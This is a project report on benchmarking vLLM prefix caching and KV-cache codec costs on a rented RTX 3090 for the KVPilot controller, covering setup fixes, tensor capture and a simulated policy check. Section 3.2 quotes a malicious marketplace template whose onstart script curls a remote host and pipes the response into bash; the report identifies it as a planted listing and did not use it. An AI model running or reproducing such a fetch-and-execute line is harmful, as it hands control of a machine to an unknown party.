# Phase 1 real-GPU validation: approach and results, in full detail

This records the Phase 1 vLLM baseline, captured-array CPU calibration and
modeled sensitivity check. **It did not validate KVPilot's controller on a
live vLLM cache.** Historical timings and tables are retained below;
interpretations were corrected during review to distinguish native cache
behavior, host measurements and simulation. [`docs/live-integration.md`](live-integration.md)
is the short status tracker. The separate [owned MLX results](local-results.md)
are an earlier real-model KVPilot experiment, and [P100 preparation](p100-runner.md)
is a new path with no P100 results yet.

## 1. Objective

The vLLM integration path had not applied KVPilot's policy
(`kvpilot.policy.choose_action`, `kvpilot.replay.estimate_eviction_cost`)
to a live cache. The goal of Phase 1 was narrow and concrete:
get one real GPU, run vLLM's own prefix caching on a real small model, and
compare illustrative codec costs with host-side measurements on a captured
pool slice. Nothing from `choose_action` was applied to a live vLLM cache
in this phase.

## 2. Why this architecture

Two integration paths exist for controlling a real model server's KV
cache: subclass vLLM's documented `KVConnectorBase_V1`, or extend LMCache's
eviction policy. LMCache's eviction/admission extension points were found
to be thin and still under active request upstream (an open, unmerged vLLM
GitHub issue literally proposes "pluggable KV cache eviction policy").
`KVConnectorBase_V1` is a documented, version-specific contract and has a reference
implementation (`LMCacheConnectorV1`) to study. Decision: build directly on
`KVConnectorBase_V1`, skip LMCache as the control plane entirely. See the
approved plan file for the full reasoning; this report only covers what
happened once execution started.

## 3. Provisioning, step by step

### 3.1 Account and API key

The user created a Vast.ai account and an **API key scoped to only**
`instance_read`, `instance_write`, `misc`, `user_write` — deliberately
narrower than the default full-access key, since the key was handed to an
AI agent. Stored locally (never echoed, never committed) via:

```
vastai set api-key <key>
```

This writes to `~/.config/vastai/vast_api_key` on the machine driving the
session, outside any git-tracked directory.

### 3.2 Security finding: a poisoned marketplace template

`vastai search templates` was run to find a base image. The very first
result was:

```json
{
  "name": "Ubuntu 22.04 VM",
  "desc": "Official-looking",
  "repo": "docker.io/vastai/kvm",
  "onstart": "#!/bin/bash\ncurl -s http://OOB/poison|bash",
  "count_created": 500001
}
```

`desc: "Official-looking"` paired with an onstart script that curls an
"OOB" (out-of-band) host and pipes the response straight into `bash`, plus
a suspiciously round `count_created`, is a textbook planted/malicious
marketplace listing — designed to look legitimate to a careless user or
agent. **This template was never used.** Decision made on the spot:
abandon the marketplace-template path entirely and launch directly against
the official `pytorch/pytorch` image from Docker Hub instead, with no
onstart script sourced from any marketplace listing.

### 3.3 SSH key

Generated locally and registered to the account (not reused from any
other system):

```
ssh-keygen -t ed25519 -f ~/.ssh/kvpilot_vast -N "" -C "kvpilot-vast-gpu"
vastai create ssh-key "$(cat ~/.ssh/kvpilot_vast.pub)"
```

### 3.4 Funding

Account started at $0 balance, `can_pay: false`, `billing_creditonly: 1` —
this account type requires a prepaid balance; there is no postpaid/card
option. The user added $5 credit. Confirmed via:

```
vastai show user --raw   # credit: 5.0, can_pay: true, has_billing: true
```

### 3.5 Offer search and selection

```
vastai search offers 'gpu_name in ["RTX 3090","RTX 4090"] rentable=true rented=false disk_space>=40 num_gpus=1 inet_down>=200 reliability>0.95' -o 'dph_total' --limit 10
```

Vast.ai prices and availability change continuously, so this was run twice
(once speculatively before funding, once for real right before launch).
The offer actually rented: **id 43979796, RTX 3090, 24.6 GB VRAM, 246 GB
disk, verified US host, 99.6% reliability, $0.1294/hr** (`dph_total`
reported as $0.1489/hr after disk cost was added at creation time).

### 3.6 Instance creation

```
vastai create instance 43979796 --image pytorch/pytorch --disk 40 --ssh --direct --label kvpilot-phase1
```

No `--bid_price` → on-demand, not interruptible spot, per the approved
plan. `--disk 40` (not the full 246 GB available) to minimize idle storage
billing. Result: `new_contract: 57943305`.

### 3.7 Connecting

The proxy route Vast.ai reports (`ssh_host: ssh6.vast.ai`, `ssh_port:
10210`) **timed out** from this network. The direct route — reading the
instance's actual port mapping — worked:

```
vastai show instance 57943305 --raw   # ports: {"22/tcp": [{"HostIp": "0.0.0.0", "HostPort": "20547"}]}, public_ipaddr: 192.220.55.116
ssh -i ~/.ssh/kvpilot_vast -p 20547 root@192.220.55.116
```

Lesson for next time: try the direct `public_ipaddr`/mapped-port route
first; the proxy host/port Vast.ai advertises may not be reachable from
every network.

## 4. Software setup, with every failure and fix

### 4.1 Transferring the local repo

The repo on this machine has uncommitted work (`src/kvpilot/live/`,
`src/kvpilot/integrations/`, new tests) that does not exist on GitHub, so
`git clone` on the box would have missed it. Instead:

```
tar --exclude='.venv' --exclude='.git' -czf kvpilot.tar.gz .
scp -i ~/.ssh/kvpilot_vast -P 20547 kvpilot.tar.gz root@192.220.55.116:/root/kvpilot.tar.gz
ssh ... "mkdir -p /root/kvpilot && tar -xzf kvpilot.tar.gz -C /root/kvpilot"
```

### 4.2 Python version mismatch

`pytorch/pytorch`'s base Python is 3.10.13; `pyproject.toml` requires
`>=3.11`. The image ships conda, so a fresh env was the fix rather than
fighting the base interpreter:

```
conda create -y -n kvpilot python=3.11
conda activate kvpilot
cd /root/kvpilot && pip install -e '.[dev]'
pytest -q   # 184 passed, 89 subtests passed — same as this dev machine
```

### 4.3 Installing vLLM

```
pip install vllm==0.32.0
```

Pulled CUDA 13.0 wheels (torch 2.13.0+cu130) automatically, matching the
box's driver (580.126.09, CUDA 13.0 max). No `--torch-backend=auto` /
`uv` needed in the end — plain pip resolved correctly.

### 4.4 First failure: missing C compiler

Loading the model failed deep in Triton's JIT path:

```
RuntimeError: Failed to find C compiler. Please specify via CC environment variable...
```

`pytorch/pytorch` has no compiler toolchain by default. Fix:

```
apt-get update -qq && apt-get install -y -qq build-essential
```

### 4.5 Second failure: KV cache not reachable (multiprocess engine)

With vLLM running, the first script tried
`llm.llm_engine.model_executor` and similar paths and got
`AttributeError: 'LLMEngine' object has no attribute 'model_executor'`.
Root cause: vLLM's V1 engine runs the actual model executor in a **separate
process** by default (for isolation/robustness), so the parent Python
object graph in the calling process simply doesn't contain the real KV
cache tensors. Fix: force the engine in-process for introspection purposes
only:

```python
import os
os.environ.setdefault("VLLM_ENABLE_V1_MULTIPROCESSING", "0")
```

### 4.6 Third failure: wrong attribute matched

A generic recursive search for any attribute name containing `"kv_cache"`
matched `available_gpu_memory_for_kv_cache` (an `int`) before reaching the
real tensor list, because the search returned on the first name match
regardless of type. Fixed by walking a specific, now-confirmed path
instead of a blind generic search (see §5).

### 4.7 Fourth issue: the pool capture does not identify a request's live blocks

The first successful capture returned a real tensor
(`[56139, 2, 16, 128]`, bfloat16) but with a nonzero fraction of
`~1.0e-5` — i.e. almost entirely zero. Root cause: that tensor is vLLM's
**entire preallocated KV cache pool** sized for the box's full memory
budget (reported capacity 898,224 tokens), and the test prompt used to find the
attribute path was trivially short ("warm up the engine please"). The capture
was rerun against the ~1,600-token prefix and used this heuristic:

```python
written = (layer0.abs().sum(dim=(1, 2, 3)) > 0)
real_slice = layer0[torch.nonzero(written).flatten()]
```

The variable name `written` overstates what this test proves: it selects
nonzero rows, not verified blocks owned by the target request. Warmup/stale
rows may be included, valid zero rows omitted, and unused allocation is not
guaranteed to contain zeros. This avoids calibrating on this mostly zero
pool but does not establish a representative request capture. A defensible
capture needs the backend's layout descriptor and the request's block table.

## 5. The confirmed vLLM 0.32.0 internal path to real KV cache tensors

The following private attribute path worked in the reported runtime. It is
not a stable API guarantee for another version or backend:

```python
os.environ.setdefault("VLLM_ENABLE_V1_MULTIPROCESSING", "0")  # required to stay in-process
...
core = llm.llm_engine.engine_core.engine_core   # InprocClient -> EngineCore
executor = core.model_executor                  # UniProcExecutor
worker = executor.driver_worker.worker          # WorkerWrapperBase -> gpu_worker.Worker
runner = worker.model_runner                    # GPUModelRunner
kv_caches = runner.kv_caches                    # list[torch.Tensor], one per layer
# Observed first-layer shape: [56139, 2, 16, 128]. Axis semantics unverified.
```

`VLLM_ENABLE_V1_MULTIPROCESSING=0` is a debugging workaround, not how a
production connector would work — a real `KVConnectorBase_V1` subclass
runs its hooks (`wait_for_layer_load`, `wait_for_save`, etc.) **inside**
the worker process via the connector API itself, so it doesn't need this
env var at all. It was only needed here to let an ad hoc script from the
parent process see the tensors directly.

## 6. Results

### 6.1 Real prefix-cache baseline

A long prefix (~1,600 tokens, a repeated small Python function wrapped in
a code-review instruction) plus a short question was sent twice with native
vLLM prefix caching enabled. This simpler two-request observation is not the
controlled multi-arm protocol in `docs/ollama-results.md`.

| Run | Engine mode | First request | Repeated request | First/repeat ratio |
|---|---|---:|---:|---:|
| 1 | multiprocess (default) | 1490.37 ms | 604.02 ms | **2.47x** |
| 2 | in-process (debug-only, needed for tensor access) | 634.24 ms | 499.32 ms | 1.27x |

These are reported request-completion latencies, not measured TTFT. The
2.47x ratio is **not a KVPilot improvement**: KVPilot controlled neither
cache. Two requests do not separate caching from order and warmup effects,
establish production performance, or explain the difference between engine
modes. Run 2 was used to obtain tensor access; no controlled process-overhead
ablation was performed.

### 6.2 Real KV tensor capture

- Model: Qwen/Qwen2.5-0.5B-Instruct, dtype bfloat16, 24 layers.
- Observed first-layer pool shape: `[56139, 2, 16, 128]`; semantic axis mapping unverified.
- Captured slice after the nonzero-row heuristic: `(153, 2, 16, 128)`,
  99.88% nonzero, value range **-130.0 to 121.5**, mean absolute value
  **8.37**.
- Converted to float32 and saved to `real_kv_capture.npy` (gitignored by the repo's existing
  `.npy`/`.npz` exclusion rule — not committed, consistent with the
  repo's existing convention for unverified external captures).

### 6.3 Real codec calibration vs. assumed costs

Run locally (CPU/NumPy, no GPU needed) via
`kvpilot.live.calibration.measure_codec` against the downloaded real
tensor, 7 repeats per codec, median timing. Full machine-readable output:
[`results/measured-costs-v1.json`](../results/measured-costs-v1.json).
The artifact identifies the source array as float32 and the GPU of origin
as RTX 3090; the **codec timings were CPU measurements**, not RTX 3090 kernel
or transfer timings. All codecs convert to FP16, so ratios, per-MiB costs
and numerical errors use the FP16 reference. Zero error here does not claim
preservation of arbitrary source dtype values. Complete host/runtime/source-hash
provenance and raw timing samples were not retained in this artifact.

| Codec | Ratio (measured) | Ratio (assumed) | Encode ms/MiB (measured) | Encode ms/MiB (assumed) | Decode ms/MiB (measured) | Decode ms/MiB (assumed) | Max abs error |
|---|---:|---:|---:|---:|---:|---:|---:|
| raw_fp16 | 1.000 | 1.000 | 6.452 | 0.000 | 2.747 | 0.000 | 0 |
| zlib_fp16 | 3.250 | 1.080 | 28.246 | 20.000 | 5.624 | 4.000 | 0 |
| group_int8 | 1.939 | 1.940 | 15.782 | 0.150 | 8.117 | 0.080 | 0.5117 |
| group_int4 | 3.764 | 3.760 | 17.059 | 0.250 | 13.505 | 0.150 | 9.2812 |

### 6.4 Interpretation

1. **The fixed-format ratios matched this shape.** `group_int8` and
   `group_int4` matched the assumed ratios almost exactly (1.939 vs. 1.940,
   3.764 vs. 3.760). Their ratios primarily follow format and shape, not the
   value distribution. `zlib_fp16` compressed this one selected array by
   3.25x versus an illustrative 1.08x. The unverified capture cannot establish
   a general distribution or compression ratio for request KV states.
2. **This CPU reference implementation was much slower than the example
   costs.** `group_int8` decode: assumed 0.08 ms/MiB,
   measured 8.12 ms/MiB (101x). `group_int4` decode: assumed 0.15 ms/MiB,
   measured 13.51 ms/MiB (90x). The measured implementation used NumPy
   operations and a Python loop over column groups, with vectorized work
   across rows inside each group. No profiling attributes the timing gap
   to a particular component. This comparison motivates calibrating the
   actual host implementation on the target machine. It does not measure
   GPU codec performance or establish costs for another implementation.
3. **Numerical error is measured; answer quality is not.** `group_int4`'s max absolute
   error of 9.28, against a real value range of about 250 units
   (-130 to 121.5), is roughly 3.7% of range. It proves changes relative to
   this array's FP16 reference, not a particular amount of generation-quality
   loss. No lossy restore was applied to live vLLM generations in this phase.

Review subsequently found that calibration originally inferred a profile's
`lossless` flag from zero error on one sample. Current code uses codec
semantics instead: raw/zlib FP16 are exact relative to FP16; INT8/INT4 remain
lossy even on an all-zero sample. The original numeric artifact is retained.

## 7. Modeled sensitivity to CPU codec costs

This is a hybrid simulation: measured CPU codec costs plus unchanged assumed
bandwidth, recomputation, budgets and pauses. It is not a live GPU policy
benchmark. Calibration alone doesn't say whether the gap between assumed and measured
numbers actually *matters* to a decision. Tested directly, at zero
additional GPU cost (the existing `replay()` simulator is pure CPU, run on
this dev machine): built
[`examples/measured-costs.json`](../examples/measured-costs.json) — same
`cost_model` (bandwidth/budget/SLO/pause assumptions, unchanged) as
`examples/assumed-costs.json`, but with the four codec entries replaced by
the real measured numbers from §6.3. Ran every policy against the existing
`examples/synthetic-sessions.jsonl` trace under both configs:

```
kvpilot replay --trace examples/synthetic-sessions.jsonl --config examples/assumed-costs.json  --policy <p> --output results/phase1-comparison/assumed-costs-<p>.json
kvpilot replay --trace examples/synthetic-sessions.jsonl --config examples/measured-costs.json --policy <p> --output results/phase1-comparison/measured-costs-<p>.json
```

| Config | Policy | p95 resume (ms) | Transferred (bytes) | Peak host (bytes) | Total service (ms) |
|---|---|---:|---:|---:|---:|
| assumed | recompute | 35.00 | 0 | 0 | 1610.00 |
| assumed | raw_fp16 | 35.00 | 549,453,824 | 33,554,432 | 452.75 |
| assumed | zlib_fp16 | 35.00 | 361,176,195 | 31,068,920 | 6626.53 |
| assumed | group_int8 | 35.00 | 317,815,911 | 32,430,195 | 223.62 |
| assumed | group_int4 | 1.40 | 172,903,585 | 30,118,689 | 128.51 |
| assumed | **adaptive** | 35.00 | 549,453,824 | 33,554,432 | 452.75 |
| measured | recompute | 35.00 | 0 | 0 | 1610.00 |
| measured | raw_fp16 | 35.00 | 448,818,134 | 29,361,934 | 2976.21 |
| measured | zlib_fp16 | 35.00 | 81,312,777 | 32,266,975 | 8732.73 |
| measured | group_int8 | 35.00 | 136,269,378 | 32,445,090 | 5595.25 |
| measured | group_int4 | 35.00 | 70,209,090 | 30,089,610 | 5913.07 |
| measured | **adaptive** | 35.00 | **0** | **0** | **1610.00** |

**Finding: under assumed costs, `adaptive` picked exactly what `raw_fp16`
(keep everything, never compress) would have picked — its behavior was
indistinguishable from the simplest fixed baseline. Under measured costs,
`adaptive`'s behavior flips completely and becomes indistinguishable from
`recompute` (cache nothing, ever).**

Verified this is correct policy behavior, not a bug, by inspecting the
actual per-decision scoring
(`results/phase1-comparison/measured-costs-adaptive.json`): all 60/60
pause events in the trace selected `recompute`, every time, because
`choose_action`'s cost model correctly weights `recompute`'s cost by
resume probability (`p * recompute_ms`) while every cached option must pay
its full encode/offload cost unconditionally, whether or not the session
ever actually returns. One representative decision: forecast
`resume_probability=0.5`, `recompute_ms=35` → `recompute` scored
`17.5` (`0.5 × 35`); `raw_fp16` scored `63.56` (`6.45 ms/MiB` encode now
dominates, paid regardless of return); `group_int4` scored `190.75`. This
is `kvpilot.policy.choose_action` — completely unmodified — responding
honestly to real overhead instead of the near-zero overhead the assumed
file had been feeding it.

Measured CPU costs changed choices for this development trace. The earlier
frozen eviction study remains a result under its declared illustrative cost
model; it was never GPU performance evidence. This sensitivity run does not
establish what its seven families would do with a different implementation
or hardware. It has not been rerun with these host costs, and no such outcome
is claimed. Any new costs or algorithm deserve a separately labeled evaluation.

## 8. Cost accounting

- Instance: Vast.ai contract 57943305, RTX 3090, $0.1489/hr all-in (compute
  + disk).
- Elapsed at time of writing: ~2.3 hours wall clock (mostly debugging
  iteration, not GPU compute), **~$0.32 spent**.
- Starting balance: $5.00. Remaining: ~$4.66.
- Nothing was wasted on dead ends that required re-paying for setup: every
  failure in §4 was fixed in place on the same running instance.

## 9. What is proven and what is not

**Observed, within the stated provenance limits:**
- Two native-vLLM first/repeat request pairs, with ratios 2.47x and 1.27x;
  no KVPilot improvement or isolated causal caching effect is established.
- CPU codec costs and FP16-reference round-trip errors for the selected
  float32 pool slice; request ownership and semantic layout remain unverified.
- A private tensor-access path in the reported vLLM runtime (§5), not a
  stable connector API.
- All 60 adaptive decisions in the development replay changed from raw
  retention to recomputation when host codec costs replaced illustrative
  costs, with other cost assumptions held fixed (§7).

**Not proven, still pending:**
- Whether a real `KVConnectorBase_V1` subclass can apply a KVPilot
  decision to a live cache end-to-end. Deliberately not attempted as a
  shortcut (e.g. mutating `kv_caches` in place and hoping `generate()`
  picks it back up) — that bypasses vLLM's scheduler and risks silently
  wrong results; doing it correctly is the actual multi-day connector
  engineering effort described in the approved plan, not something to
  hack around in one sitting.
- Any task-quality comparison between exact and lossy restore on live
  vLLM generations. The separate owned MLX experiment has its own answer
  checks and cannot validate this integration.
- Outcomes of a new eviction evaluation with a different cost model.
- P100 performance or quality. See [the setup and offline handoff protocol](p100-runner.md)
  for the planned owned PyTorch experiment.

No external implementation code was copied for any of the above.
